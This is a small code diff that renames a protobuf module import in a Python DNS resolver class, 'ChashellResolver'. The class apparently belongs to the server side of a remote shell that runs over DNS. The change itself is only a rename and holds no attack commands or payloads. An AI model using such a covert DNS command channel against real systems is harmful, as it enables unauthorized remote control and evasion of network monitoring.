@@ -11,7 +11,7 @@ from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE
 from dnslib.server import DNSServer, BaseResolver
 
 from lib.crypto.symetric import open_sealed
-from lib.protocol import chacomm_pb2
+from lib.protocol import comm_pb2
 from lib.logging import printf, println
 import cli
 
@@ -106,7 +106,7 @@ class ChashellResolver(BaseResolver):
                 return "-"
             
             # Parse protobuf message
-            message = chacomm_pb2.Message()
+            message = comm_pb2.Message()
             try:
                 message.ParseFromString(output)
             except Exception as e:
